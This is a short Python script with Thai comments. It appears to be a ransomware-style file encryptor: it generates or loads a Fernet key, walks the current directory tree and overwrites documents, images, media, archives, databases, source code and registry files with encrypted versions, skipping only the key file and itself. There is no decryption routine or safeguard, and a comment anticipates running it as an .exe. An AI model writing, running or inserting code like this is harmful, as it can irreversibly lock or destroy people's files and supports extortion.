from cryptography.fernet import Fernet
import os
import sys

# ตรวจสอบว่ามีคีย์อยู่แล้วหรือไม่ ถ้าไม่มีให้สร้างใหม่
key_file = "key.key"
if not os.path.exists(key_file):
    key = Fernet.generate_key()
    with open(key_file, "wb") as f:
        f.write(key)
else:
    with open(key_file, "rb") as f:
        key = f.read()

fernet = Fernet(key)

# สกุลไฟล์ที่ต้องการเข้ารหัส
file_extensions = (
    ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx", ".csv",
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".tif", ".ico",
    ".mp3", ".wav", ".wma", ".ogg", ".mp4", ".avi", ".mov", ".wmv",
    ".zip", ".rar", ".7z", ".tar", ".gz",
    ".db", ".mdb", ".accdb", ".sqlite", ".sql",
    ".html", ".htm", ".css", ".js", ".php", ".c", ".cpp", ".java", ".cs", ".xml", ".json",
    ".iso", ".log", ".reg", ".torrent"
)

# ตรวจสอบชื่อไฟล์สคริปต์ปัจจุบัน (.py หรือ .exe)
current_file = os.path.basename(sys.argv[0])

# วนลูปเข้ารหัสไฟล์
for root, _, files in os.walk(os.getcwd()):
    for file in files:
        if not file.endswith(file_extensions):
            continue
        if file == "key.key" or file == current_file:
            continue  # ข้ามไฟล์ key และไฟล์ตัวเอง

        file_path = os.path.join(root, file)

        try:
            with open(file_path, "rb") as f:
                data = f.read()

            # ตรวจสอบว่าไฟล์ถูกเข้ารหัสแล้วหรือยัง
            try:
                fernet.decrypt(data)
                print(f"[SKIP] Already encrypted: {file_path}")
            except:
                encrypted = fernet.encrypt(data)
                with open(file_path, "wb") as f:
                    f.write(encrypted)
                print(f"[ENCRYPTED] {file_path}")

        except PermissionError:
            print(f"[PERMISSION DENIED] {file_path}")
        except Exception as e:
            print(f"[ERROR] {file_path} => {e}")
